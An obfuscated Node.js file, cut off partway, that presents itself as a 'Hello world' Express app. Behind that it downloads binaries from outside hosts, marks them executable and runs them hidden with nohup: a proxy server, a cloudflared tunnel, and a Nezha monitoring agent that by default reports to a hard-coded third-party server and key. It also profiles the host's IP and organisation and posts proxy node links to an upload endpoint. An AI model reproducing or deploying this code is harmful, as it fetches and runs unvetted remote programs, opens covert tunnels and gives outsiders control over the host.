const _0x48d5bc=_0x4dc1;(function(_0x104419,_0x1dcbb2){const _0x4f6b16={_0x3a4b47:0xd9,_0x699209:0x154},_0x341ab2=_0x4dc1,_0x1ddca5=_0x104419();while(!![]){try{const _0x83bb93=-parseInt(_0x341ab2(0xec))/0x1+-parseInt(_0x341ab2(_0x4f6b16._0x3a4b47))/0x2*(-parseInt(_0x341ab2(_0x4f6b16._0x699209))/0x3)+parseInt(_0x341ab2(0x176))/0x4+-parseInt(_0x341ab2(0x132))/0x5+parseInt(_0x341ab2(0xfc))/0x6+-parseInt(_0x341ab2(0x124))/0x7*(parseInt(_0x341ab2(0x106))/0x8)+parseInt(_0x341ab2(0x17d))/0x9;if(_0x83bb93===_0x1dcbb2)break;else _0x1ddca5['push'](_0x1ddca5['shift']());}catch(_0x4b50d6){_0x1ddca5['push'](_0x1ddca5['shift']());}}}(_0x4d6e,0x27aea));const express=require('express'),app=express(),axios=require(_0x48d5bc(0x14f)),os=require('os'),fs=require('fs'),path=require(_0x48d5bc(0x13b)),{promisify}=require(_0x48d5bc(0x129)),exec=promisify(require(_0x48d5bc(0x113))[_0x48d5bc(0x10e)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x48d5bc(0x16a)][_0x48d5bc(0x131)]||'',PROJECT_URL=process[_0x48d5bc(0x16a)][_0x48d5bc(0xfa)]||'',AUTO_ACCESS=process[_0x48d5bc(0x16a)][_0x48d5bc(0x190)]||![],FILE_PATH=process[_0x48d5bc(0x16a)][_0x48d5bc(0x107)]||_0x48d5bc(0x180),SUB_PATH=process[_0x48d5bc(0x16a)]['SUB_PATH']||_0x48d5bc(0xdb),PORT=process[_0x48d5bc(0x16a)][_0x48d5bc(0x126)]||process[_0x48d5bc(0x16a)]['PORT']||0xbb8,UUID=process['env']['UUID']||_0x48d5bc(0x175),NEZHA_SERVER=process[_0x48d5bc(0x16a)][_0x48d5bc(0x102)]||'agn.xinxi.pp.ua:443',NEZHA_PORT=process[_0x48d5bc(0x16a)][_0x48d5bc(0xf7)]||'',NEZHA_KEY=process[_0x48d5bc(0x16a)][_0x48d5bc(0x18b)]||_0x48d5bc(0x172),ARGO_DOMAIN=process[_0x48d5bc(0x16a)][_0x48d5bc(0xd5)]||_0x48d5bc(0x13f),ARGO_AUTH=process[_0x48d5bc(0x16a)]['ARGO_AUTH']||_0x48d5bc(0x10b),ARGO_PORT=process[_0x48d5bc(0x16a)][_0x48d5bc(0x11c)]||0x1f41,CFIP=process[_0x48d5bc(0x16a)][_0x48d5bc(0x16c)]||_0x48d5bc(0x116),CFPORT=process[_0x48d5bc(0x16a)][_0x48d5bc(0xf5)]||0x1bb,NAME=process[_0x48d5bc(0x16a)][_0x48d5bc(0x108)]||_0x48d5bc(0x193);!fs['existsSync'](FILE_PATH)?(fs[_0x48d5bc(0x12e)](FILE_PATH),console['log'](FILE_PATH+_0x48d5bc(0xef))):console[_0x48d5bc(0x136)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x373456={_0x1e6ea6:0x103},_0x31a435=_0x48d5bc,_0x2b3dfb=_0x31a435(0xf3);let _0x4d8d80='';for(let _0x14fe35=0x0;_0x14fe35<0x6;_0x14fe35++){_0x4d8d80+=_0x2b3dfb['charAt'](Math[_0x31a435(0x17b)](Math[_0x31a435(_0x373456._0x1e6ea6)]()*_0x2b3dfb[_0x31a435(0x13e)]));}return _0x4d8d80;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x48d5bc(0x17a)](FILE_PATH,npmName),phpPath=path[_0x48d5bc(0x17a)](FILE_PATH,phpName),webPath=path[_0x48d5bc(0x17a)](FILE_PATH,webName),botPath=path[_0x48d5bc(0x17a)](FILE_PATH,botName),subPath=path[_0x48d5bc(0x17a)](FILE_PATH,_0x48d5bc(0x166)),listPath=path[_0x48d5bc(0x17a)](FILE_PATH,_0x48d5bc(0x150)),bootLogPath=path[_0x48d5bc(0x17a)](FILE_PATH,_0x48d5bc(0x14b)),configPath=path['join'](FILE_PATH,_0x48d5bc(0x10d));function deleteNodes(){const _0x3916f7={_0x3d82ad:0x18a,_0x10de50:0xe7,_0x539782:0x186,_0x4aa90b:0x121,_0x3b6868:0x13e,_0x12b51d:0x196,_0x49610f:0xe0},_0x162775=_0x48d5bc;try{if(!UPLOAD_URL)return;if(!fs[_0x162775(_0x3916f7._0x3d82ad)](subPath))return;let _0x1fe6d1;try{_0x1fe6d1=fs[_0x162775(_0x3916f7._0x10de50)](subPath,'utf-8');}catch{return null;}const _0x20aa22=Buffer[_0x162775(_0x3916f7._0x539782)](_0x1fe6d1,'base64')[_0x162775(_0x3916f7._0x4aa90b)]('utf-8'),_0x5d0f3f=_0x20aa22[_0x162775(0xd4)]('\x0a')[_0x162775(0xdc)](_0x25ffdb=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x162775(0x15e)](_0x25ffdb));if(_0x5d0f3f[_0x162775(_0x3916f7._0x3b6868)]===0x0)return;return axios[_0x162775(0x182)](UPLOAD_URL+_0x162775(_0x3916f7._0x12b51d),JSON['stringify']({'nodes':_0x5d0f3f}),{'headers':{'Content-Type':_0x162775(_0x3916f7._0x49610f)}})['catch'](_0x5f3635=>{return null;}),null;}catch(_0x6399dd){return null;}}function cleanupOldFiles(){const _0x2f7b6c={_0xc372d0:0x100,_0x371e4a:0x133},_0x1fcafe={_0x3ab11e:0x15b},_0x56ebd9=_0x48d5bc;try{const _0x4278ac=fs[_0x56ebd9(_0x2f7b6c._0xc372d0)](FILE_PATH);_0x4278ac[_0x56ebd9(_0x2f7b6c._0x371e4a)](_0x1073da=>{const _0x2ba553=_0x56ebd9,_0x49daa7=path[_0x2ba553(0x17a)](FILE_PATH,_0x1073da);try{const _0x3b5232=fs[_0x2ba553(_0x1fcafe._0x3ab11e)](_0x49daa7);_0x3b5232['isFile']()&&fs['unlinkSync'](_0x49daa7);}catch(_0x345235){}});}catch(_0x31ec90){}}app[_0x48d5bc(0x15f)]('/',function(_0x488928,_0x42acb9){const _0x5348b7={_0x145f35:0x134},_0xde37db=_0x48d5bc;_0x42acb9[_0xde37db(_0x5348b7._0x145f35)]('Hello\x20world!');});async function generateConfig(){const _0x15eb7a={_0x1cffa5:0xe5,_0x50d3b5:0x165,_0x40a3b4:0x195,_0x5efd87:0xdd,_0x5cead0:0x14d,_0x29e7fc:0x148,_0x31ed50:0x195,_0x3c4b84:0x16b,_0x38b177:0x167,_0x2781cc:0x101,_0x1b7d6e:0x148,_0x506185:0x148,_0x5ddcaf:0x11f,_0x1dfc91:0x14d,_0x69315:0x10a,_0x16513f:0x11e,_0x3b0a10:0x173,_0x4a7b0c:0x112,_0x1c8abc:0x10d},_0x5de91f=_0x48d5bc,_0x18ed21={'log':{'access':_0x5de91f(_0x15eb7a._0x1cffa5),'error':'/dev/null','loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x5de91f(_0x15eb7a._0x50d3b5),'settings':{'clients':[{'id':UUID,'flow':_0x5de91f(0x12a)}],'decryption':_0x5de91f(_0x15eb7a._0x40a3b4),'fallbacks':[{'dest':0xbb9},{'path':_0x5de91f(_0x15eb7a._0x5efd87),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x5de91f(_0x15eb7a._0x5cead0),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x5de91f(0x165),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':_0x5de91f(0x195)}},{'port':0xbba,'listen':_0x5de91f(_0x15eb7a._0x29e7fc),'protocol':_0x5de91f(_0x15eb7a._0x50d3b5),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x5de91f(_0x15eb7a._0x31ed50)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x5de91f(0xdd)}},'sniffing':{'enabled':!![],'destOverride':[_0x5de91f(_0x15eb7a._0x3c4b84),_0x5de91f(_0x15eb7a._0x38b177),_0x5de91f(_0x15eb7a._0x2781cc)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x5de91f(_0x15eb7a._0x1b7d6e),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x5de91f(0xe3)}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x5de91f(0x101)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x5de91f(_0x15eb7a._0x506185),'protocol':_0x5de91f(_0x15eb7a._0x5ddcaf),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x5de91f(0x195),'wsSettings':{'path':_0x5de91f(_0x15eb7a._0x1dfc91)}},'sniffing':{'enabled':!![],'destOverride':[_0x5de91f(0x16b),_0x5de91f(_0x15eb7a._0x38b177),_0x5de91f(_0x15eb7a._0x2781cc)],'metadataOnly':![]}}],'dns':{'servers':[_0x5de91f(_0x15eb7a._0x69315)]},'outbounds':[{'protocol':_0x5de91f(_0x15eb7a._0x16513f),'tag':_0x5de91f(0x197)},{'protocol':_0x5de91f(_0x15eb7a._0x3b0a10),'tag':_0x5de91f(_0x15eb7a._0x4a7b0c)}]};fs['writeFileSync'](path[_0x5de91f(0x17a)](FILE_PATH,_0x5de91f(_0x15eb7a._0x1c8abc)),JSON[_0x5de91f(0xd3)](_0x18ed21,null,0x2));}function getSystemArchitecture(){const _0xbb11ed={_0x4e6a87:0xf1,_0x4b5d6e:0x118},_0x38858f=_0x48d5bc,_0x28fef4=os[_0x38858f(_0xbb11ed._0x4e6a87)]();return _0x28fef4===_0x38858f(0x118)||_0x28fef4==='arm64'||_0x28fef4===_0x38858f(0xe6)?_0x38858f(_0xbb11ed._0x4b5d6e):_0x38858f(0x16f);}function downloadFile(_0x3e5607,_0x42329a,_0x4801f2){const _0x8ffb5f={_0x4ff81c:0x188,_0x45064a:0x15f,_0x5f0e4c:0xed},_0x2f499d={_0x2a44cc:0x152,_0x403348:0x192,_0x51f7d:0x183},_0x544a24={_0x4d32b0:0x11a},_0x207cd5={_0xc36f00:0x140,_0x2929d6:0x136},_0x20b9a6=_0x48d5bc,_0x4f5b83=_0x3e5607;!fs['existsSync'](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x25f50d=fs[_0x20b9a6(_0x8ffb5f._0x4ff81c)](_0x4f5b83);axios({'method':_0x20b9a6(_0x8ffb5f._0x45064a),'url':_0x42329a,'responseType':'stream'})[_0x20b9a6(_0x8ffb5f._0x5f0e4c)](_0x2f42fb=>{const _0x1bda38={_0x23b18d:0x10f,_0x3aac23:0x192},_0x43528e=_0x20b9a6;_0x2f42fb[_0x43528e(0xfd)][_0x43528e(0x199)](_0x25f50d),_0x25f50d['on'](_0x43528e(_0x544a24._0x4d32b0),()=>{const _0x57b4c0=_0x43528e;_0x25f50d[_0x57b4c0(_0x207cd5._0xc36f00)](),console[_0x57b4c0(_0x207cd5._0x2929d6)](_0x57b4c0(0x152)+path['basename'](_0x4f5b83)+_0x57b4c0(0x130)),_0x4801f2(null,_0x4f5b83);}),_0x25f50d['on'](_0x43528e(0x183),_0xe16ea7=>{const _0xe834d8=_0x43528e;fs['unlink'](_0x4f5b83,()=>{});const _0x43aee5='Download\x20'+path['basename'](_0x4f5b83)+_0xe834d8(_0x1bda38._0x23b18d)+_0xe16ea7[_0xe834d8(_0x1bda38._0x3aac23)];console[_0xe834d8(0x183)](_0x43aee5),_0x4801f2(_0x43aee5);});})[_0x20b9a6(0x12f)](_0x34fc61=>{const _0x520ef6=_0x20b9a6,_0x33d1f1=_0x520ef6(_0x2f499d._0x2a44cc)+path['basename'](_0x4f5b83)+'\x20failed:\x20'+_0x34fc61[_0x520ef6(_0x2f499d._0x403348)];console[_0x520ef6(_0x2f499d._0x51f7d)](_0x33d1f1),_0x4801f2(_0x33d1f1);});}async function downloadFilesAndRun(){const _0x3d6e99={_0x557d5e:0x15c,_0x109777:0x157,_0x2e5c7a:0xd4,_0x31aa9e:0x18c,_0x1ec454:0x177,_0x461e78:0x16e,_0x573f05:0xd6,_0x21bc8a:0x18d,_0x475b4b:0x13d,_0x32ff17:0x18f,_0x2905d1:0x177,_0x50959f:0xf4,_0x5b5d36:0x16e,_0x17bd88:0x139,_0xc8e660:0x155,_0x5ba016:0x136,_0x4d5e13:0x183,_0x3af6dd:0x136,_0x121cc2:0x120,_0x4f34c5:0x141,_0x6671a7:0x162,_0x26cdf0:0x18f,_0x305a40:0x110},_0x5af250={_0x1cfb72:0x145,_0x378a10:0x160},_0x2bf926=_0x48d5bc,_0x2ef563=getSystemArchitecture(),_0x3cf0ea=getFilesForArchitecture(_0x2ef563);if(_0x3cf0ea[_0x2bf926(0x13e)]===0x0){console[_0x2bf926(0x136)](_0x2bf926(_0x3d6e99._0x557d5e));return;}const _0x59f20f=_0x3cf0ea['map'](_0x52f2a7=>{return new Promise((_0x5e8adf,_0x36b9ac)=>{const _0x5eca8d=_0x4dc1;downloadFile(_0x52f2a7[_0x5eca8d(_0x5af250._0x1cfb72)],_0x52f2a7[_0x5eca8d(_0x5af250._0x378a10)],(_0x5b502d,_0x95c7ee)=>{_0x5b502d?_0x36b9ac(_0x5b502d):_0x5e8adf(_0x95c7ee);});});});try{await Promise[_0x2bf926(_0x3d6e99._0x109777)](_0x59f20f);}catch(_0x19baef){console[_0x2bf926(0x183)]('Error\x20downloading\x20files:',_0x19baef);return;}function _0xbf54ab(_0x2962fc){const _0x2a6e60={_0x64be4a:0x183,_0x325180:0x161},_0x4c6ac3=0x1fd;_0x2962fc['forEach'](_0xc39677=>{const _0x47bd60=_0x4dc1;fs[_0x47bd60(0x18a)](_0xc39677)&&fs['chmod'](_0xc39677,_0x4c6ac3,_0x27c44c=>{const _0xde008=_0x47bd60;_0x27c44c?console[_0xde008(_0x2a6e60._0x64be4a)](_0xde008(0xf8)+_0xc39677+':\x20'+_0x27c44c):console[_0xde008(0x136)](_0xde008(_0x2a6e60._0x325180)+_0xc39677+':\x20'+_0x4c6ac3[_0xde008(0x121)](0x8));});});}const _0x1adea5=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0xbf54ab(_0x1adea5);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x497a68=NEZHA_SERVER[_0x2bf926(0x139)](':')?NEZHA_SERVER[_0x2bf926(_0x3d6e99._0x2e5c7a)](':')['pop']():'',_0x45f802=new Set([_0x2bf926(_0x3d6e99._0x31aa9e),_0x2bf926(_0x3d6e99._0x1ec454),'2096','2087','2083',_0x2bf926(_0x3d6e99._0x461e78)]),_0x398e34=_0x45f802[_0x2bf926(_0x3d6e99._0x573f05)](_0x497a68)?_0x2bf926(_0x3d6e99._0x21bc8a):'false',_0x1d68bc=_0x2bf926(0x194)+NEZHA_KEY+_0x2bf926(0xf6)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x398e34+_0x2bf926(0x12d)+UUID;fs['writeFileSync'](path['join'](FILE_PATH,_0x2bf926(0x138)),_0x1d68bc);const _0x2986ae=_0x2bf926(_0x3d6e99._0x475b4b)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x2bf926(0xdf);try{await exec(_0x2986ae),console[_0x2bf926(0x136)](phpName+_0x2bf926(_0x3d6e99._0x32ff17)),await new Promise(_0x48fb37=>setTimeout(_0x48fb37,0x3e8));}catch(_0x50b419){console['error']('php\x20running\x20error:\x20'+_0x50b419);}}else{let _0x90deb9='';const _0x201651=[_0x2bf926(0x18c),_0x2bf926(_0x3d6e99._0x2905d1),_0x2bf926(0x170),_0x2bf926(_0x3d6e99._0x50959f),'2083',_0x2bf926(_0x3d6e99._0x5b5d36)];_0x201651[_0x2bf926(_0x3d6e99._0x17bd88)](NEZHA_PORT)&&(_0x90deb9=_0x2bf926(_0x3d6e99._0xc8e660));const _0x1a7a3e='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x90deb9+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x1a7a3e),console[_0x2bf926(_0x3d6e99._0x5ba016)](npmName+_0x2bf926(0x18f)),await new Promise(_0x467d7a=>setTimeout(_0x467d7a,0x3e8));}catch(_0x33bec9){console[_0x2bf926(_0x3d6e99._0x4d5e13)](_0x2bf926(0x14a)+_0x33bec9);}}}else console[_0x2bf926(_0x3d6e99._0x3af6dd)](_0x2bf926(0x146));const _0x49e048='nohup\x20'+webPath+_0x2bf926(0xf2)+FILE_PATH+_0x2bf926(0x187);try{await exec(_0x49e048),console['log'](webName+'\x20is\x20running'),await new Promise(_0x8b13e5=>setTimeout(_0x8b13e5,0x3e8));}catch(_0x41c8ec){console[_0x2bf926(_0x3d6e99._0x4d5e13)](_0x2bf926(0x168)+_0x41c8ec);}if(fs['existsSync'](botPath)){let _0x106eaf;if(ARGO_AUTH[_0x2bf926(_0x3d6e99._0x121cc2)](/^[A-Z0-9a-z=]{120,250}$/))_0x106eaf=_0x2bf926(0x16d)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x106eaf='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x2bf926(_0x3d6e99._0x4f34c5):_0x106eaf=_0x2bf926(0x109)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x2bf926(_0x3d6e99._0x475b4b)+botPath+'\x20'+_0x106eaf+_0x2bf926(_0x3d6e99._0x6671a7)),console['log'](botName+_0x2bf926(_0x3d6e99._0x26cdf0)),await new Promise(_0x4dfe3b=>setTimeout(_0x4dfe3b,0x7d0));}catch(_0x1ab7fe){console[_0x2bf926(0x183)](_0x2bf926(_0x3d6e99._0x305a40)+_0x1ab7fe);}}await new Promise(_0x131b7c=>setTimeout(_0x131b7c,0x1388));}function getFilesForArchitecture(_0x140f58){const _0x3692bc={_0x3ed384:0x118,_0xddf927:0xda},_0x15d33b=_0x48d5bc;let _0x3417b1;_0x140f58===_0x15d33b(_0x3692bc._0x3ed384)?_0x3417b1=[{'fileName':webPath,'fileUrl':_0x15d33b(0xd7)},{'fileName':botPath,'fileUrl':_0x15d33b(_0x3692bc._0xddf927)}]:_0x3417b1=[{'fileName':webPath,'fileUrl':_0x15d33b(0xe2)},{'fileName':botPath,'fileUrl':_0x15d33b(0xe8)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x5641ae=_0x140f58===_0x15d33b(0x118)?_0x15d33b(0x17c):_0x15d33b(0xff);_0x3417b1['unshift']({'fileName':npmPath,'fileUrl':_0x5641ae});}else{const _0x429d49=_0x140f58===_0x15d33b(0x118)?'https://arm64.ssss.nyc.mn/v1':_0x15d33b(0x142);_0x3417b1[_0x15d33b(0x137)]({'fileName':phpPath,'fileUrl':_0x429d49});}}return _0x3417b1;}function _0x4dc1(_0x10228e,_0x1f8900){const _0x4d6e4f=_0x4d6e();return _0x4dc1=function(_0x4dc11a,_0x54abb0){_0x4dc11a=_0x4dc11a-0xd3;let _0x7129e7=_0x4d6e4f[_0x4dc11a];return _0x7129e7;},_0x4dc1(_0x10228e,_0x1f8900);}function argoType(){const _0x1f2cd1={_0x267a84:0x181,_0x2ada8a:0x198,_0x36bfe9:0x169,_0x2782b9:0x147,_0x1244ed:0x189,_0x294b6a:0x119,_0x50fc83:0x136},_0xb52e99=_0x48d5bc;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0xb52e99(_0x1f2cd1._0x267a84));return;}if(ARGO_AUTH[_0xb52e99(0x139)](_0xb52e99(_0x1f2cd1._0x2ada8a))){fs[_0xb52e99(0x119)](path[_0xb52e99(0x17a)](FILE_PATH,_0xb52e99(_0x1f2cd1._0x36bfe9)),ARGO_AUTH);const _0x186b7e=_0xb52e99(_0x1f2cd1._0x2782b9)+ARGO_AUTH['split']('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0xb52e99(0x17a)](FILE_PATH,_0xb52e99(0x169))+_0xb52e99(_0x1f2cd1._0x1244ed)+ARGO_DOMAIN+_0xb52e99(0x105)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0xb52e99(_0x1f2cd1._0x294b6a)](path['join'](FILE_PATH,_0xb52e99(0x122)),_0x186b7e);}else console[_0xb52e99(_0x1f2cd1._0x50fc83)](_0xb52e99(0x12b));}async function extractDomains(){const _0x43eaf3={_0xb4ff17:0x136,_0x9e16a6:0x149,_0x5b8e26:0xd4,_0x3681c0:0x133,_0x3ceb40:0x13c,_0x1610a1:0x153,_0x58f256:0x109,_0x2a731b:0x162,_0x3efe72:0x110,_0x26e89f:0x183},_0x3590c6={_0x559b3c:0xfd,_0x5504f6:0x123,_0x64615e:0x18e,_0x5ada6a:0x18e,_0x1848b6:0x114,_0x49eacb:0x18e,_0x19b759:0xfd,_0x3447fc:0x117},_0x3c1e9c={_0x1c32bd:0x185,_0x2cc297:0x127,_0xe02eb2:0x125},_0x29a5e5=_0x48d5bc;let _0x3dfd0e;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3dfd0e=ARGO_DOMAIN,console[_0x29a5e5(_0x43eaf3._0xb4ff17)](_0x29a5e5(_0x43eaf3._0x9e16a6),_0x3dfd0e),await _0x5896ff(_0x3dfd0e);else try{const _0xb44f8c=fs['readFileSync'](path['join'](FILE_PATH,_0x29a5e5(0x14b)),'utf-8'),_0x31efca=_0xb44f8c[_0x29a5e5(_0x43eaf3._0x5b8e26)]('\x0a'),_0x4cd6b9=[];_0x31efca[_0x29a5e5(_0x43eaf3._0x3681c0)](_0x1afc3a=>{const _0x485422=_0x29a5e5,_0x1504c4=_0x1afc3a['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1504c4){const _0x2344c8=_0x1504c4[0x1];_0x4cd6b9[_0x485422(0xf9)](_0x2344c8);}});if(_0x4cd6b9['length']>0x0)_0x3dfd0e=_0x4cd6b9[0x0],console[_0x29a5e5(0x136)](_0x29a5e5(_0x43eaf3._0x3ceb40),_0x3dfd0e),await _0x5896ff(_0x3dfd0e);else{console[_0x29a5e5(_0x43eaf3._0xb4ff17)](_0x29a5e5(_0x43eaf3._0x1610a1)),fs[_0x29a5e5(0x179)](path['join'](FILE_PATH,'boot.log'));async function _0x27c72f(){const _0x3018a3=_0x29a5e5;try{process[_0x3018a3(_0x3c1e9c._0x1c32bd)]===_0x3018a3(0x144)?await exec(_0x3018a3(_0x3c1e9c._0x2cc297)+botName+_0x3018a3(0x135)):await exec('pkill\x20-f\x20\x22['+botName[_0x3018a3(_0x3c1e9c._0xe02eb2)](0x0)+']'+botName['substring'](0x1)+_0x3018a3(0x14c));}catch(_0x2913cb){}}_0x27c72f(),await new Promise(_0x3cf195=>setTimeout(_0x3cf195,0xbb8));const _0x1c84da=_0x29a5e5(_0x43eaf3._0x58f256)+FILE_PATH+_0x29a5e5(0x143)+ARGO_PORT;try{await exec(_0x29a5e5(0x13d)+botPath+'\x20'+_0x1c84da+_0x29a5e5(_0x43eaf3._0x2a731b)),console[_0x29a5e5(0x136)](botName+'\x20is\x20running'),await new Promise(_0x555569=>setTimeout(_0x555569,0xbb8)),await extractDomains();}catch(_0x44182c){console['error'](_0x29a5e5(_0x43eaf3._0x3efe72)+_0x44182c);}}}catch(_0x4350ce){console[_0x29a5e5(_0x43eaf3._0x26e89f)](_0x29a5e5(0x11d),_0x4350ce);}async function _0x510751(){const _0x1d7a55=_0x29a5e5;try{const _0x2f40b=await axios['get']('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x2f40b[_0x1d7a55(_0x3590c6._0x559b3c)]&&_0x2f40b[_0x1d7a55(_0x3590c6._0x559b3c)][_0x1d7a55(_0x3590c6._0x5504f6)]&&_0x2f40b[_0x1d7a55(0xfd)][_0x1d7a55(_0x3590c6._0x64615e)])return _0x2f40b['data'][_0x1d7a55(0x123)]+'_'+_0x2f40b[_0x1d7a55(0xfd)][_0x1d7a55(_0x3590c6._0x5ada6a)];}catch(_0x5cca03){try{const _0x451553=await axios['get'](_0x1d7a55(_0x3590c6._0x1848b6),{'timeout':0xbb8});if(_0x451553[_0x1d7a55(0xfd)]&&_0x451553[_0x1d7a55(0xfd)]['status']===_0x1d7a55(0x13a)&&_0x451553[_0x1d7a55(0xfd)]['countryCode']&&_0x451553[_0x1d7a55(0xfd)][_0x1d7a55(_0x3590c6._0x49eacb)])return _0x451553['data'][_0x1d7a55(0x184)]+'_'+_0x451553[_0x1d7a55(_0x3590c6._0x19b759)]['org'];}catch(_0x20004b){}}return _0x1d7a55(_0x3590c6._0x3447fc);}async function _0x5896ff(_0xe509f2){const _0x5ac56c=await _0x510751(),_0xe4c0ac=NAME?NAME+'-'+_0x5ac56c:_0x5ac56c;return new Promise(_0x36c21b=>{const _0x6fd2bd={_0x4edf56:0x195,_0x4f905e:0x195,_0x2ce92f:0x178,_0x4540a9:0xf0,_0x91bcde:0x128,_0x46bf92:0x163,_0x132ac9:0xfb,_0x4bb840:0x121,_0x31ba1a:0x14e,_0x3fbac7:0x191,_0x2647f2:0x186,_0x7fb7f4:0x121,_0x1bc409:0xeb,_0x31dbe8:0x136},_0x463ad3={_0x28dc76:0x186,_0x4d0a62:0x134};setTimeout(()=>{const _0x538ca8=_0x4dc1,_0x4d0c48={'v':'2','ps':''+_0xe4c0ac,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x538ca8(_0x6fd2bd._0x4edf56),'net':'ws','type':_0x538ca8(_0x6fd2bd._0x4f905e),'host':_0xe509f2,'path':_0x538ca8(_0x6fd2bd._0x2ce92f),'tls':'tls','sni':_0xe509f2,'alpn':'','fp':_0x538ca8(0xee)},_0xd1602f=_0x538ca8(0xfe)+UUID+'@'+CFIP+':'+CFPORT+_0x538ca8(_0x6fd2bd._0x4540a9)+_0xe509f2+_0x538ca8(_0x6fd2bd._0x91bcde)+_0xe509f2+_0x538ca8(_0x6fd2bd._0x46bf92)+_0xe4c0ac+_0x538ca8(_0x6fd2bd._0x132ac9)+Buffer[_0x538ca8(0x186)](JSON['stringify'](_0x4d0c48))[_0x538ca8(_0x6fd2bd._0x4bb840)](_0x538ca8(0xeb))+_0x538ca8(_0x6fd2bd._0x31ba1a)+UUID+'@'+CFIP+':'+CFPORT+_0x538ca8(_0x6fd2bd._0x3fbac7)+_0xe509f2+'&fp=firefox&type=ws&host='+_0xe509f2+_0x538ca8(0x115)+_0xe4c0ac+'\x0a\x20\x20\x20\x20';console['log'](Buffer['from'](_0xd1602f)['toString'](_0x538ca8(0xeb))),fs[_0x538ca8(0x119)](subPath,Buffer[_0x538ca8(_0x6fd2bd._0x2647f2)](_0xd1602f)[_0x538ca8(_0x6fd2bd._0x7fb7f4)](_0x538ca8(_0x6fd2bd._0x1bc409))),console[_0x538ca8(_0x6fd2bd._0x31dbe8)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x538ca8(0x15f)]('/'+SUB_PATH,(_0x5b6333,_0x188bca)=>{const _0x5142c0=_0x538ca8,_0xdaf3dd=Buffer[_0x5142c0(_0x463ad3._0x28dc76)](_0xd1602f)['toString'](_0x5142c0(0xeb));_0x188bca[_0x5142c0(0xe1)](_0x5142c0(0x11b),'text/plain;\x20charset=utf-8'),_0x188bca[_0x5142c0(_0x463ad3._0x4d0a62)](_0xdaf3dd);}),_0x36c21b(_0xd1602f);},0x7d0);});}}async function uploadNodes(){const _0x135f02={_0x57da29:0xe0,_0x23a61f:0x17f,_0x12890f:0xde,_0x4d3aed:0xe4,_0x7744bc:0x18a,_0x453cac:0xe7,_0x6aa0a9:0xdc,_0x3343a0:0xd3,_0x2c1430:0x182,_0x5dcaf3:0x156},_0x51f378=_0x48d5bc;if(UPLOAD_URL&&PROJECT_URL){const _0x18daed=PROJECT_URL+'/'+SUB_PATH,_0x4a339e={'subscription':[_0x18daed]};try{const _0x357e19=await axios[_0x51f378(0x182)](UPLOAD_URL+_0x51f378(0x159),_0x4a339e,{'headers':{'Content-Type':_0x51f378(_0x135f02._0x57da29)}});return _0x357e19&&_0x357e19[_0x51f378(_0x135f02._0x23a61f)]===0xc8?(console[_0x51f378(0x136)](_0x51f378(_0x135f02._0x12890f)),_0x357e19):null;}catch(_0x344177){if(_0x344177['response']){if(_0x344177[_0x51f378(_0x135f02._0x4d3aed)][_0x51f378(0x17f)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x51f378(_0x135f02._0x7744bc)](listPath))return;const _0x5b7325=fs[_0x51f378(_0x135f02._0x453cac)](listPath,_0x51f378(0xe9)),_0x3dfe35=_0x5b7325['split']('\x0a')[_0x51f378(_0x135f02._0x6aa0a9)](_0x1ae3ff=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x1ae3ff));if(_0x3dfe35['length']===0x0)return;const _0xc6fda3=JSON[_0x51f378(_0x135f02._0x3343a0)]({'nodes':_0x3dfe35});try{const _0x4dd3c5=await axios[_0x51f378(_0x135f02._0x2c1430)](UPLOAD_URL+_0x51f378(0x171),_0xc6fda3,{'headers':{'Content-Type':_0x51f378(_0x135f02._0x57da29)}});return 